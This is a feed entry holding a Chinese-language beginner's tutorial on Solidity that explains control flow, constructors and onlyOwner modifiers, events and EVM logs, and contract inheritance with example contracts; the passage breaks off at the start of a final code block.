    <entry>
      <title>Solidity入门学习(二)</title>
      <link href="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/"/>
      <url>/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="控制流">控制流</h2><p>这一讲，我们将介绍<code>Solidity</code>中的控制流。</p><p>测试代码<code>Control.sol</code>，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Controlflow &#123;</span><br><span class="line">    // if else</span><br><span class="line">    function ifElseTest(uint256 _number) public pure returns(bool)&#123;</span><br><span class="line">        if(_number == 0)&#123;</span><br><span class="line">            return(true);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return(false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // for loop</span><br><span class="line">    function forLoopTest() public pure returns(uint256)&#123;</span><br><span class="line">        uint sum = 0;</span><br><span class="line">        for(uint i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">            sum += i;</span><br><span class="line">        &#125;</span><br><span class="line">        return(sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // while</span><br><span class="line">    function whileTest() public pure returns(uint256)&#123;</span><br><span class="line">        uint sum = 0;</span><br><span class="line">        uint i = 0;</span><br><span class="line">        while(i &lt; 10)&#123;</span><br><span class="line">            sum += i;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        return(sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // do-while</span><br><span class="line">    function doWhileTest() public pure returns(uint256)&#123;</span><br><span class="line">        uint sum = 0;</span><br><span class="line">        uint i = 0;</span><br><span class="line">        do&#123;</span><br><span class="line">            sum += i;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;while(i &lt; 10);</span><br><span class="line">        return(sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 三元运算符 ternary/conditional operator</span><br><span class="line">    function ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123;</span><br><span class="line">        // return the max of x and y</span><br><span class="line">        return x &gt;= y ? x: y; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意⚠️</strong>：<code>Solidity</code>中最常用的变量类型是<code>uint</code>，也就是正整数，取到负值的话，会报<code>underflow</code>错误。</p><h3 id="控制流-2">控制流</h3><p><code>Solidity</code>的控制流与其他语言类似，主要包含以下几种：</p><ol><li>if-else</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function ifElseTest(uint256 _number) public pure returns(bool)&#123;</span><br><span class="line">    if(_number == 0)&#123;</span><br><span class="line">        return(true);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return(false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>for循环</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function forLoopTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    for(uint i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">        sum += i;</span><br><span class="line">    &#125;</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>while循环</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function whileTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    uint i = 0;</span><br><span class="line">    while(i &lt; 10)&#123;</span><br><span class="line">        sum += i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>do-while循环</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function doWhileTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    uint i = 0;</span><br><span class="line">    do&#123;</span><br><span class="line">        sum += i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;while(i &lt; 10);</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>三目运算</li></ol><p>三元运算符是<code>Solidity</code>中唯一一个接受三个操作数的运算符，规则<code>条件? 条件为真的表达式:条件为假的表达式</code>。此运算符经常用作<code>if</code>语句的快捷方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 三元运算符 ternary/conditional operator</span><br><span class="line">function ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123;</span><br><span class="line">    // return the max of x and y</span><br><span class="line">    return x &gt;= y ? x: y; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>另外还有<code>continue</code>（立即进入下一个循环）和<code>break</code>（跳出当前循环）关键字可以使用。</strong></p><h2 id="构造函数和修饰器">构造函数和修饰器</h2><p>这一讲，我们将用合约权限控制（<code>Ownable</code>）的例子介绍<code>Solidity</code>语言中构造函数（<code>constructor</code>）和独有的修饰器（<code>modifier</code>）。测试代码<code>Owner.sol</code>，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract Owner &#123;</span><br><span class="line">    //定义owner变量</span><br><span class="line">    address public owner;</span><br><span class="line">    </span><br><span class="line">    //构造函数</span><br><span class="line">    constructor(address initialOwner)&#123;</span><br><span class="line">        //在部署合约时，将owner设置为initialOwner</span><br><span class="line">        owner = initialOwner;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier onlyOwner&#123;</span><br><span class="line">        //检查地址是否为owner</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        //如果是的话，继续运行函数主体，否则报错并revert交易</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    //</span><br><span class="line">    function changeOwner(address _newOwner) external onlyOwner&#123;</span><br><span class="line">        //只有owner能运行这个函数</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数">构造函数</h3><p>构造函数（<code>constructor</code>）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的<code>owner</code>地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address owner; // 定义owner变量</span><br><span class="line">// 构造函数</span><br><span class="line">constructor(address initialOwner) &#123;</span><br><span class="line">    owner = initialOwner; // 在部署合约的时候，将owner设置为传入的initialOwner地址</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：构造函数在不同的Solidity版本中的语法并不一致，在<strong>Solidity 0.4.22之前</strong>，构造函数不使用 <code>constructor</code> 而是使用与合约名同名的函数作为构造函数而使用，由于这种旧写法容易使开发者在书写时发生疏漏（例如合约名叫 <code>Parents</code>，构造函数名写成 <code>parents</code>），使得构造函数变成普通函数，引发漏洞，所以0.4.22版本及之后，采用了全新的 <code>constructor</code> 写法。</p><p>构造函数的旧写法代码示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity =0.4.21;</span><br><span class="line">contract Parents &#123;</span><br><span class="line">    // 与合约名Parents同名的函数就是构造函数</span><br><span class="line">    function Parents () public &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修饰器">修饰器</h3><p>修饰器（<code>modifier</code>）是<code>Solidity</code>特有的语法，类似于面向对象编程中的装饰器（<code>decorator</code>），声明函数拥有的特性，并减少代码冗余。它就像钢铁侠的智能盔甲，穿上它的函数会带有某些特定的行为。<code>modifier</code>的主要使用场景是运行函数前的检查，例如地址，变量，余额等。</p><p>我们来定义一个叫做onlyOwner的modifier：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyOwner&#123;</span><br><span class="line">        //检查地址是否为owner</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        //如果是的话，继续运行函数主体，否则报错并revert交易</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>带有<code>onlyOwner</code>修饰符的函数只能被<code>owner</code>地址调用，比如下面这个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//定义一个带有onlyOwner修饰符的函数</span><br><span class="line">    function changeOwner(address _newOwner) external onlyOwner&#123;</span><br><span class="line">        //只有owner能运行这个函数，并改变owner</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们定义了一个<code>changeOwner</code>函数，运行它可以改变合约的<code>owner</code>，但是由于<code>onlyOwner</code>修饰符的存在，只有原先的<code>owner</code>可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。</p><h3 id="运行测试">运行测试</h3><p>首先是部署代码，传递一个需要初始化的<code>owner</code>，初始化<code>owner</code>为<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150027700.png" alt="image-20250126150027700"></p><p>使用另一个用户<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>，去调用合约，并尝试修改<code>owner</code>。<code>owner</code>修改失败！</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150311002.png" alt="image-20250126150311002"></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150255810.png" alt="image-20250126150255810"></p><p>尝试使用部署时输入的账户``0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`。</p><p>去改变<code>owner</code>为<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>，<code>owner</code>修改成功！</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150540552.png" alt="image-20250126150540552"></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150740601.png" alt="image-20250126150740601"></p><h2 id="事件">事件</h2><p>这一讲，我们用转账ERC20代币为例来介绍<code>Solidity</code>中的事件（<code>event</code>）。</p><p>测试代码<code>Events.sol</code>,代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract Events&#123;</span><br><span class="line">    //定义_balances映射变量，记录每个地址的比特币数量</span><br><span class="line">    mapping(address =&gt; uint256) public _balances;</span><br><span class="line"></span><br><span class="line">    //定义Transfer event，记录transfer交易的转账地址，接收地址和转账数量。</span><br><span class="line">    event Transfer(address indexed from,address indexed to,uint256 value);</span><br><span class="line"></span><br><span class="line">    //定义_transfer函数，执行转账逻辑</span><br><span class="line">    function _transfer(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) external &#123;</span><br><span class="line">        //给转账地址一些初始代币</span><br><span class="line">        _balances[from] = 10000000;</span><br><span class="line"></span><br><span class="line">        //from地址减去转账数量</span><br><span class="line">        _balances[from] -= amount;</span><br><span class="line">        //to地址加上转账数量</span><br><span class="line">        _balances[to] += amount;</span><br><span class="line"></span><br><span class="line">        //释放事件</span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="事件-2">事件</h3><p><code>Solidity</code>中的事件（<code>event</code>）是<code>EVM</code>上日志的抽象，它具有两个特点：</p><ul><li>响应：应用程序（<a href="https://learnblockchain.cn/docs/ethers.js/api-contract.html#id18"><code>ethers.js</code></a>）可以通过<code>RPC</code>接口订阅和监听这些事件，并在前端做响应。</li><li>经济：事件是<code>EVM</code>上比较经济的存储数据的方式，每个大概消耗2,000 <code>gas</code>；相比之下，链上存储一个新变量至少需要20,000 <code>gas</code>。</li></ul><h3 id="声明事件">声明事件</h3><p>事件的声明由<code>event</code>关键字开头，接着是事件名称，括号里面写好事件需要记录的变量类型和变量名。</p><p>以<code>ERC20</code>代币合约的<code>Transfer</code>事件为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br></pre></td></tr></table></figure><p>我们可以看到，<code>Transfer</code>事件共记录了3个变量<code>from</code>，<code>to</code>和<code>value</code>，分别对应代币的转账地址，接收地址和转账数量，其中<code>from</code>和<code>to</code>前面带有<code>indexed</code>关键字，他们会保存在以太坊虚拟机日志的<code>topics</code>中，方便之后检索。</p><h3 id="释放事件">释放事件</h3><p>我们可以在函数里释放事件。在下面的例子中，每次用<code>_transfer()</code>函数进行转账操作的时候，都会释放<code>Transfer</code>事件，并记录相应的变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 定义_transfer函数，执行转账逻辑</span><br><span class="line">function _transfer(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external &#123;</span><br><span class="line"></span><br><span class="line">    _balances[from] = 10000000; // 给转账地址一些初始代币</span><br><span class="line"></span><br><span class="line">    _balances[from] -=  amount; // from地址减去转账数量</span><br><span class="line">    _balances[to] += amount; // to地址加上转账数量</span><br><span class="line"></span><br><span class="line">    // 释放事件</span><br><span class="line">    emit Transfer(from, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="EVM日志-Log">EVM日志(Log)</h3><p>以太坊虚拟机（EVM）用日志<code>Log</code>来存储<code>Solidity</code>事件，每条日志记录都包含主题<code>topics</code>和数据<code>data</code>两部分。</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126183129690.png" alt="image-20250126183129690"></p><h3 id="主题-Topics">主题(Topics)</h3><p>日志的第一部分是主题数组，用于描述事件，长度不能超过<code>4</code>。它的第一个元素是事件的签名（哈希）。</p><p>对于上面的<code>Transfer</code>事件，它的事件哈希就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keccak256(&quot;Transfer(address,address,uint256)&quot;)</span><br><span class="line"></span><br><span class="line">//0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</span><br></pre></td></tr></table></figure><p>除了事件哈希，主题还可以包含至多<code>3</code>个<code>indexed</code>参数，也就是<code>Transfer</code>事件中的<code>from</code>和<code>to</code>。</p><p><code>indexed</code>标记的参数可以理解为检索事件的索引“键”，方便之后搜索。每个 <code>indexed</code> 参数的大小为固定的256比特，如果参数太大了（比如字符串），就会自动计算哈希存储在主题中。</p><p>这里其实会引入一个新的问题，根据Solidity的<a href="https://docs.soliditylang.org/en/v0.8.27/abi-spec.html#encoding-of-indexed-event-parameters">官方文档</a>, 对于非值类型的参数（如arrays, bytes, strings）, Solidity不会直接存储，而是会将<code>Keccak-256</code>哈希存储在主题中，从而导致数据信息的丢失。这对于某些依赖于链上事件的DAPP（跨链，用户注册等等）来说，可能会导致事件检索困难，需要解析哈希值。</p><h3 id="数据-Data">数据(Data)</h3><p>事件中不带 <code>indexed</code>的参数会被存储在 <code>data</code> 部分中，可以理解为事件的&quot;值&quot;。<code>data</code> 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 <code>data</code> 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 <code>topics</code> 部分中，也是以哈希的方式存储。另外，<code>data</code> 部分的变量在存储上消耗的gas相比于 <code>topics</code> 更少。</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126185114449.png" alt="image-20250126185114449"></p><p><code>Topics</code>里面有三个元素，第一个是这个事件的哈希，第二和三是我们定义的两个<code>indexed</code>变量的信息，即转账的转出地址和接收地址。<code>Data</code>里面是剩下的不带<code>indexed</code>的变量，也就是转账数量。可以在上图看到<code>Data</code>部分为<code>0x32</code>，50的16进制。</p><h2 id="继承">继承</h2><p>这一讲，我们介绍<code>Solidity</code>中的继承（<code>inheritance</code>），包括简单继承，多重继承，以及修饰器（<code>Modifier</code>）和构造函数（<code>Constructor</code>）的继承。</p><h3 id="继承-2">继承</h3><p>继承是面向对象编程很重要的组成部分，可以显著减少重复代码。如果把合约看作是对象的话，<code>Solidity</code>也是面向对象的编程，也支持继承。</p><h3 id="规则">规则</h3><ul><li><code>virtual</code>: 父合约中的函数，如果<strong>希望子合约重写，需要加上<code>virtual</code>关键字。</strong></li><li><code>override</code>：<strong>子合约重写了父合约中的函数，需要加上<code>override</code>关键字</strong>。</li></ul><p><strong>注意</strong>：用<code>override</code>修饰<code>public</code>变量，会重写与变量同名的<code>getter</code>函数，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapping(address =&gt; uint256) public override balanceOf;</span><br></pre></td></tr></table></figure><h3 id="简单继承">简单继承</h3><p>我们先写一个简单的爷爷合约<code>Yeye</code>，里面包含1个<code>Log</code>事件和3个<code>function</code>: <code>hip()</code>, <code>pop()</code>, <code>yeye()</code>，输出都是”Yeye”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Yeye &#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line"></span><br><span class="line">    // 定义3个function: hip(), pop(), yeye()，Log值为Yeye。</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们再定义一个爸爸合约<code>Baba</code>，让他继承<code>Yeye</code>合约，语法就是<code>contract Baba is Yeye</code>，非常直观。在<code>Baba</code>合约里，我们重写一下<code>hip()</code>和<code>pop()</code>这两个函数，加上<code>override</code>关键字，并将他们的输出改为<code>”Baba”</code>；并且加一个新的函数<code>baba</code>，输出也是<code>”Baba”</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出改为Baba。</span><br><span class="line">    function hip() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function baba() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的测试代码<code>Yeye.sol</code>，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Yeye&#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line">    // 定义3个function: hip(), pop(), yeye()，Log值为Yeye。</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出改为Baba。</span><br><span class="line">    function hip() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function baba() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126213523593.png" alt="image-20250126213523593"></p><h3 id="多重继承">多重继承</h3><p><code>Solidity</code>的合约可以继承多个合约。规则：</p><ol><li>继承时要按辈分最高到最低的顺序排。比如我们写一个<code>Erzi</code>合约，继承<code>Yeye</code>合约和<code>Baba</code>合约，那么就要写成<code>contract Erzi is Yeye, Baba</code>，而不能写成<code>contract Erzi is Baba, Yeye</code>，不然就会报错。</li><li>如果某一个函数在多个继承的合约里都存在，比如例子中的<code>hip()</code>和<code>pop()</code>，在子合约里必须重写，不然会报错。</li><li>重写在多个父合约中都重名的函数时，<code>override</code>关键字后面要加上所有父合约名字，例如<code>override(Yeye, Baba)</code>。</li></ol><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract Erzi is Yeye, Baba&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出值为Erzi。</span><br><span class="line">    function hip() public virtual override(Yeye, Baba)&#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override(Yeye, Baba) &#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，<code>Erzi</code>合约里面重写了<code>hip()</code>和<code>pop()</code>两个函数，将输出改为<code>”Erzi”</code>，并且还分别从<code>Yeye</code>和<code>Baba</code>合约继承了<code>yeye()</code>和<code>baba()</code>两个函数。</p><p>完整的测试代码<code>Yeye.sol</code>，完整的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span 